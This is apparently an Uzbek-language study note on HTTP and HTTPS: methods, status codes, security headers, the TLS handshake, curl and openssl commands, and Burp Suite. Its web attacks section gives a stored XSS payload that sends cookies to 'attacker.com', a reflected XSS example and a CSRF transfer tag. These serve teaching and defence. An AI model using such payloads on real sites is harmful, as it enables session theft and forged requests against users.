# HTTP va HTTPS

## HTTP nima?

HTTP (HyperText Transfer Protocol) — veb-brauzer va server orasidagi aloqa protokoli. Port 80.  
HTTPS — SSL/TLS bilan shifrlangan HTTP. Port 443.

## HTTP So'rov Tuzilmasi

```
GET /index.html HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: text/html
Connection: keep-alive
Cookie: session=abc123

[Body — POST da bo'ladi]
```

## HTTP Javob Tuzilmasi

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Length: 1234
Set-Cookie: session=xyz789; HttpOnly; Secure
Server: nginx/1.20

<!DOCTYPE html>...
```

## HTTP Metodlar

| Metod | Maqsad | Xavfsizlik |
|-------|--------|------------|
| GET | Ma'lumot olish | Idempotent |
| POST | Ma'lumot yuborish | Body bor |
| PUT | To'liq yangilash | Idempotent |
| PATCH | Qisman yangilash | — |
| DELETE | O'chirish | Idempotent |
| HEAD | Faqat header | GET kabi |
| OPTIONS | Qo'llab-quvvatlanadigan metodlar | CORS |

## Status Kodlar

```
1xx — Axborot
  100 Continue

2xx — Muvaffaqiyat
  200 OK
  201 Created
  204 No Content

3xx — Yo'naltirish
  301 Moved Permanently
  302 Found (Vaqtinchalik)
  304 Not Modified

4xx — Mijoz xatosi
  400 Bad Request
  401 Unauthorized (Autentifikatsiya kerak)
  403 Forbidden (Ruxsat yo'q)
  404 Not Found
  405 Method Not Allowed
  429 Too Many Requests

5xx — Server xatosi
  500 Internal Server Error
  502 Bad Gateway
  503 Service Unavailable
```

## Muhim HTTP Headerlar

### Xavfsizlik Headerlari (Server yuboradi)
```
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy: default-src 'self'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Referrer-Policy: no-referrer
```

### Cookie Atributlari
```
Set-Cookie: session=abc; 
  HttpOnly;   ← JS dan o'qib bo'lmaydi (XSS himoyasi)
  Secure;     ← Faqat HTTPS orqali
  SameSite=Strict;  ← CSRF himoyasi
  Path=/;
  Expires=...
```

## HTTPS va TLS

### TLS Handshake
```
Mijoz                          Server
  |                              |
  | --- ClientHello -----------> |  (TLS versiya, cipher suites)
  | <-- ServerHello + Sertifikat |  (tanlangan cipher, sertifikat)
  | --- ClientKeyExchange -----> |  (kalit almashinuvi)
  | --- ChangeCipherSpec ------> |
  | <-- ChangeCipherSpec ------- |
  |         [Shifrlangan kanal]  |
```

### Sertifikatni Tekshirish
```bash
# Sertifikat ma'lumotlari
openssl s_client -connect example.com:443

# Sertifikat muddati
echo | openssl s_client -connect example.com:443 2>/dev/null | \
  openssl x509 -noout -dates

# Sertifikat batafsil
curl -vI https://example.com 2>&1 | grep -A5 "SSL"
```

## Web Xavfsizlik Hujumlari

### XSS (Cross-Site Scripting)
```html
<!-- Stored XSS -->
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

<!-- Reflected XSS -->
https://example.com/search?q=<script>alert(1)</script>
```

### CSRF (Cross-Site Request Forgery)
```html
<!-- Jabrlanuvchi bosadi, uning sessiyasida so'rov ketadi -->
<img src="https://bank.com/transfer?to=hacker&amount=1000">
```

### HTTP Request Smuggling
Frontend va backend server HTTP parseridagi farqdan foydalanish.

## Burp Suite bilan HTTP Tahlil

```
1. Proxy → Intercept yoqish
2. Brauzer proxy: 127.0.0.1:8080
3. So'rovni tutib olish
4. Repeater — qayta-qayta yuborish
5. Intruder — brute force / fuzzing
6. Scanner — zaifliklarni topish
```

## curl bilan Amaliyot

```bash
# GET so'rov
curl https://example.com

# Header ko'rsatish
curl -I https://example.com
curl -v https://example.com

# POST so'rov
curl -X POST -d "user=admin&pass=test" https://example.com/login

# JSON POST
curl -X POST -H "Content-Type: application/json" \
  -d '{"user":"admin"}' https://api.example.com

# Cookie bilan
curl -b "session=abc123" https://example.com

# Custom header
curl -H "Authorization: Bearer TOKEN" https://api.example.com
```
